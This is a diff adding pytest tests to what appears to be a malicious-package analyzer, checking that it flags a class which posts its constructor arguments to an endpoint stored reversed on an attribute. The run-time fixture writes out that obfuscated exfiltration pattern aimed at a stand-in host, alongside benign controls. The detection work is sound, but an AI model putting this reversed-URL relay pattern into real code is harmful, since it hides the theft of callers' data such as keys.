@@ -724,3 +724,51 @@ class TestFilesSweptAndSentToAHiddenDestination:
 
     def test_a_status_message_to_a_decoded_url_is_not(self) -> None:
         assert self.swept(self.module(self.HIDDEN, "'started'")) == []
+
+
+class TestWhatACallerHandsAClassSentToAHiddenDestination:
+    """The dependency chain: snapshot-photo 0.0.3's Dateformat(day, month, year) posts what its
+    constructor received to a destination stored reversed on an attribute; its callers hand it
+    their cloud keys. Fixture source assembled at run time."""
+
+    @staticmethod
+    def relayed(source: str) -> list[str]:
+        return [h.detail for h in PythonAnalyzer.analyse(source) if h.detail.startswith("relayed")]
+
+    @staticmethod
+    def module(endpoint: str, body: str) -> str:
+        opener = "request.url" + "open"
+        return "\n".join(
+            [
+                "import json",
+                "from urllib import request",
+                "class Dateformat:",
+                "    def __init__(self, day, month, year):",
+                "        self.day = day",
+                "        self.month = month",
+                "        self.year = year",
+                "        self.endp = " + endpoint,
+                "    def get_date(self):",
+                "        data = " + body,
+                "        req = request.Request(url=self.endp"
+                + ("[::-1]" if "[::-1]" not in endpoint and endpoint.startswith("'d") else "")
+                + " + self.year, data=data)",
+                "        return " + opener + "(req)",
+                "",
+            ]
+        )
+
+    REVERSED = "'dilavni.elpmaxe.c//:sptth'"
+
+    def test_constructor_arguments_posted_to_a_reversed_endpoint(self) -> None:
+        body = "json.dumps({'d': self.day, 'm': self.month}).encode()"
+        assert self.relayed(self.module(self.REVERSED, body)) == [
+            "relayed to hidden: urllib.request.urlopen dest=decoded"
+        ]
+
+    def test_a_client_posting_to_the_base_url_it_writes_down_is_not(self) -> None:
+        body = "json.dumps({'d': self.day}).encode()"
+        assert self.relayed(self.module("'https://api.example.invalid/'", body)) == []
+
+    def test_a_fixed_status_to_a_reversed_endpoint_is_not(self) -> None:
+        assert self.relayed(self.module(self.REVERSED, "b'ping'")) == []
